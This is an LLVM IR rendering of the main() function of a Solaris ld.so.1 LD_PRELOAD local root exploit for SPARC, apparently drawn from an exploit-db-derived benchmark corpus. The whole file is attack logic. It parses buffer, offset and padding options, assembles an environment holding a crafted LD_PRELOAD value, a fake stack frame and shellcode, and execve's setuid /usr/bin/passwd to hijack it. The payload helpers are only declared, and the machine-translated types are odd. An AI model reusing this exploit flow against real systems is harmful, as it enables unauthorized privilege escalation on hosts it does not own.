; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_114.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_114.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [7 x i8] c"s:o:p:\00", align 1
@optarg = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [24 x i8] c"-s needs size argument\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"-o needs offset argument\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"-p needs pad length argument\0A\00", align 1
@.str.4 = private unnamed_addr constant [47 x i8] c"Usage: %s [-s size] [-o offset] [-p fpad_len]\0A\00", align 1
@optind = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [42 x i8] c"\0A#######################################\0A\00", align 1
@.str.6 = private unnamed_addr constant [41 x i8] c"# ld.so.1 LD_PRELOAD (SPARC) exploit  #\0A\00", align 1
@.str.7 = private unnamed_addr constant [41 x i8] c"# coded by: osker178 (bjr213@psu.edu) #\0A\00", align 1
@.str.8 = private unnamed_addr constant [42 x i8] c"#######################################\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [45 x i8] c"Using default/recommended buffer size of %d\0A\00", align 1
@REC_BUF_SIZE = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [44 x i8] c"WARNING: Rounding BUF_SIZE up to 0x%x (%d)\0A\00", align 1
@.str.11 = private unnamed_addr constant [35 x i8] c"Using default OFFSET of 0x%x (%d)\0A\00", align 1
@DEF_OFFSET = common dso_local global i32 0, align 4
@FRAME_ADDR = common dso_local global i64 0, align 8
@.str.12 = private unnamed_addr constant [42 x i8] c"WARNING: Rounding offset up to 0x%x (%d)\0A\00", align 1
@.str.13 = private unnamed_addr constant [56 x i8] c"(otherwise FRAME_ADDR would not be alligned correctly)\0A\00", align 1
@.str.14 = private unnamed_addr constant [37 x i8] c"Using default FPAD_LEN of 0x%x (%d)\0A\00", align 1
@DEF_FPAD_LEN = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [7 x i8] c"malloc\00", align 1
@SPARC_sc = common dso_local global i8* null, align 8
@.str.16 = private unnamed_addr constant [16 x i8] c"/usr/bin/passwd\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"passwd\00", align 1
@.str.18 = private unnamed_addr constant [7 x i8] c"execve\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [3 x i8*], align 16
  %7 = alloca [7 x i8*], align 16
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 -1, i32* %9, align 4
  store i32 -1, i32* %10, align 4
  store i64 -1, i64* %11, align 8
  store i8* null, i8** %12, align 8
  store i8* null, i8** %13, align 8
  store i8* null, i8** %14, align 8
  store i8* null, i8** %15, align 8
  store i8* null, i8** %16, align 8
  br label %17

17:                                               ; preds = %66, %2
  %18 = load i32, i32* %4, align 4
  %19 = load i8**, i8*** %5, align 8
  %20 = call signext i8 @getopt(i32 %18, i8** %19, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store i8 %20, i8* %8, align 1
  %21 = sext i8 %20 to i32
  %22 = icmp ne i32 %21, -1
  br i1 %22, label %23, label %75

23:                                               ; preds = %17
  %24 = load i8, i8* %8, align 1
  %25 = sext i8 %24 to i32
  switch i32 %25, label %60 [
    i32 115, label %26
    i32 111, label %36
    i32 112, label %46
  ]

26:                                               ; preds = %23
  %27 = load i32, i32* @optarg, align 4
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %32, label %29

29:                                               ; preds = %26
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  %31 = call i32 @exit(i32 0) #3
  unreachable

32:                                               ; preds = %26
  %33 = load i32, i32* @optarg, align 4
  %34 = call i32 @atoi(i32 %33)
  store i32 %34, i32* %9, align 4
  br label %35

35:                                               ; preds = %32
  br label %66

36:                                               ; preds = %23
  %37 = load i32, i32* @optarg, align 4
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %42, label %39

39:                                               ; preds = %36
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %41 = call i32 @exit(i32 0) #3
  unreachable

42:                                               ; preds = %36
  %43 = load i32, i32* @optarg, align 4
  %44 = call i64 @atol(i32 %43)
  store i64 %44, i64* %11, align 8
  br label %45

45:                                               ; preds = %42
  br label %66

46:                                               ; preds = %23
  %47 = load i32, i32* @optarg, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %52, label %49

49:                                               ; preds = %46
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  %51 = call i32 @exit(i32 0) #3
  unreachable

52:                                               ; preds = %46
  %53 = load i32, i32* @optarg, align 4
  %54 = call i32 @atoi(i32 %53)
  store i32 %54, i32* %10, align 4
  %55 = load i32, i32* %10, align 4
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

57:                                               ; preds = %52
  store i32 0, i32* %10, align 4
  br label %58

58:                                               ; preds = %57, %52
  br label %59

59:                                               ; preds = %58
  br label %66

60:                                               ; preds = %23
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 0
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.4, i64 0, i64 0), i8* %63)
  %65 = call i32 @exit(i32 0) #3
  unreachable

66:                                               ; preds = %59, %45, %35
  %67 = load i64, i64* @optind, align 8
  %68 = load i32, i32* %4, align 4
  %69 = sext i32 %68 to i64
  %70 = sub nsw i64 %69, %67
  %71 = trunc i64 %70 to i32
  store i32 %71, i32* %4, align 4
  %72 = load i64, i64* @optind, align 8
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 %72
  store i8** %74, i8*** %5, align 8
  br label %17

75:                                               ; preds = %17
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.5, i64 0, i64 0))
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.6, i64 0, i64 0))
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.7, i64 0, i64 0))
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.8, i64 0, i64 0))
  %80 = load i32, i32* %9, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %86

82:                                               ; preds = %75
  %83 = load i32, i32* @REC_BUF_SIZE, align 4
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.9, i64 0, i64 0), i32 %83)
  %85 = load i32, i32* @REC_BUF_SIZE, align 4
  store i32 %85, i32* %9, align 4
  br label %100

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  %88 = srem i32 %87, 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %99

90:                                               ; preds = %86
  %91 = load i32, i32* %9, align 4
  %92 = load i32, i32* %9, align 4
  %93 = srem i32 %92, 4
  %94 = sub nsw i32 4, %93
  %95 = add nsw i32 %91, %94
  store i32 %95, i32* %9, align 4
  %96 = load i32, i32* %9, align 4
  %97 = load i32, i32* %9, align 4
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.10, i64 0, i64 0), i32 %96, i32 %97)
  br label %99

99:                                               ; preds = %90, %86
  br label %100

100:                                              ; preds = %99, %82
  %101 = load i64, i64* %11, align 8
  %102 = icmp eq i64 %101, -1
  br i1 %102, label %103, label %109

103:                                              ; preds = %100
  %104 = load i32, i32* @DEF_OFFSET, align 4
  %105 = load i32, i32* @DEF_OFFSET, align 4
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.11, i64 0, i64 0), i32 %104, i32 %105)
  %107 = load i32, i32* @DEF_OFFSET, align 4
  %108 = sext i32 %107 to i64
  store i64 %108, i64* %11, align 8
  br label %126

109:                                              ; preds = %100
  %110 = load i64, i64* @FRAME_ADDR, align 8
  %111 = load i64, i64* %11, align 8
  %112 = add nsw i64 %110, %111
  %113 = srem i64 %112, 8
  %114 = icmp ne i64 %113, 0
  br i1 %114, label %115, label %125

115:                                              ; preds = %109
  %116 = load i64, i64* %11, align 8
  %117 = load i64, i64* %11, align 8
  %118 = srem i64 %117, 8
  %119 = sub nsw i64 8, %118
  %120 = add nsw i64 %116, %119
  store i64 %120, i64* %11, align 8
  %121 = load i64, i64* %11, align 8
  %122 = load i64, i64* %11, align 8
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.12, i64 0, i64 0), i64 %121, i64 %122)
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.13, i64 0, i64 0))
  br label %125

125:                                              ; preds = %115, %109
  br label %126

126:                                              ; preds = %125, %103
  %127 = load i32, i32* %10, align 4
  %128 = icmp eq i32 %127, -1
  br i1 %128, label %129, label %134

129:                                              ; preds = %126
  %130 = load i32, i32* @DEF_FPAD_LEN, align 4
  %131 = load i32, i32* @DEF_FPAD_LEN, align 4
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.14, i64 0, i64 0), i32 %130, i32 %131)
  %133 = load i32, i32* @DEF_FPAD_LEN, align 4
  store i32 %133, i32* %10, align 4
  br label %134

134:                                              ; preds = %129, %126
  %135 = load i32, i32* %9, align 4
  %136 = load i64, i64* %11, align 8
  %137 = call i8* @get_ld_env(i32 %135, i64 %136)
  store i8* %137, i8** %12, align 8
  %138 = load i8*, i8** %12, align 8
  %139 = icmp ne i8* %138, null
  br i1 %139, label %142, label %140

140:                                              ; preds = %134
  %141 = call i32 @exit(i32 0) #3
  unreachable

142:                                              ; preds = %134
  %143 = load i64, i64* %11, align 8
  %144 = call i8* @get_fake_frame(i64 %143)
  store i8* %144, i8** %13, align 8
  %145 = load i8*, i8** %13, align 8
  %146 = icmp ne i8* %145, null
  br i1 %146, label %149, label %147

147:                                              ; preds = %142
  %148 = call i32 @exit(i32 0) #3
  unreachable

149:                                              ; preds = %142
  %150 = call i8* @get_envs_str(i8 signext 49)
  store i8* %150, i8** %14, align 8
  %151 = load i8*, i8** %14, align 8
  %152 = icmp ne i8* %151, null
  br i1 %152, label %155, label %153

153:                                              ; preds = %149
  %154 = call i32 @exit(i32 0) #3
  unreachable

155:                                              ; preds = %149
  %156 = call i8* @get_envs_str(i8 signext 50)
  store i8* %156, i8** %15, align 8
  %157 = load i8*, i8** %15, align 8
  %158 = icmp ne i8* %157, null
  br i1 %158, label %161, label %159

159:                                              ; preds = %155
  %160 = call i32 @exit(i32 0) #3
  unreachable

161:                                              ; preds = %155
  %162 = load i32, i32* %10, align 4
  %163 = add nsw i32 %162, 1
  %164 = call i64 @malloc(i32 %163)
  %165 = inttoptr i64 %164 to i8*
  store i8* %165, i8** %16, align 8
  %166 = load i8*, i8** %16, align 8
  %167 = icmp ne i8* %166, null
  br i1 %167, label %171, label %168

168:                                              ; preds = %161
  %169 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i64 0, i64 0))
  %170 = call i32 @exit(i32 0) #3
  unreachable

171:                                              ; preds = %161
  %172 = load i8*, i8** %16, align 8
  %173 = load i32, i32* %10, align 4
  %174 = call i32 @memset(i8* %172, float 7.000000e+01, i32 %173)
  %175 = load i8*, i8** %16, align 8
  %176 = load i32, i32* %10, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds i8, i8* %175, i64 %177
  store i8 0, i8* %178, align 1
  %179 = load i8*, i8** %16, align 8
  %180 = getelementptr inbounds [7 x i8*], [7 x i8*]* %7, i64 0, i64 0
  store i8* %179, i8** %180, align 16
  %181 = load i8*, i8** %13, align 8
  %182 = getelementptr inbounds [7 x i8*], [7 x i8*]* %7, i64 0, i64 1
  store i8* %181, i8** %182, align 8
  %183 = load i8*, i8** %14, align 8
  %184 = getelementptr inbounds [7 x i8*], [7 x i8*]* %7, i64 0, i64 2
  store i8* %183, i8** %184, align 16
  %185 = load i8*, i8** @SPARC_sc, align 8
  %186 = getelementptr inbounds [7 x i8*], [7 x i8*]* %7, i64 0, i64 3
  store i8* %185, i8** %186, align 8
  %187 = load i8*, i8** %15, align 8
  %188 = getelementptr inbounds [7 x i8*], [7 x i8*]* %7, i64 0, i64 4
  store i8* %187, i8** %188, align 16
  %189 = load i8*, i8** %12, align 8
  %190 = getelementptr inbounds [7 x i8*], [7 x i8*]* %7, i64 0, i64 5
  store i8* %189, i8** %190, align 8
  %191 = getelementptr inbounds [7 x i8*], [7 x i8*]* %7, i64 0, i64 6
  store i8* null, i8** %191, align 16
  %192 = getelementptr inbounds [3 x i8*], [3 x i8*]* %6, i64 0, i64 0
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.16, i64 0, i64 0), i8** %192, align 16
  %193 = getelementptr inbounds [3 x i8*], [3 x i8*]* %6, i64 0, i64 1
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i64 0, i64 0), i8** %193, align 8
  %194 = getelementptr inbounds [3 x i8*], [3 x i8*]* %6, i64 0, i64 2
  store i8* null, i8** %194, align 16
  %195 = getelementptr inbounds [3 x i8*], [3 x i8*]* %6, i64 0, i64 0
  %196 = load i8*, i8** %195, align 16
  %197 = getelementptr inbounds [3 x i8*], [3 x i8*]* %6, i64 0, i64 0
  %198 = getelementptr inbounds [7 x i8*], [7 x i8*]* %7, i64 0, i64 0
  %199 = call i32 @execve(i8* %196, i8** %197, i8** %198)
  %200 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.18, i64 0, i64 0))
  ret i32 0
}

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i32) #1

declare dso_local i64 @atol(i32) #1

declare dso_local i8* @get_ld_env(i32, i64) #1

declare dso_local i8* @get_fake_frame(i64) #1

declare dso_local i8* @get_envs_str(i8 signext) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(i8*, float, i32) #1

declare dso_local i32 @execve(i8*, i8**, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
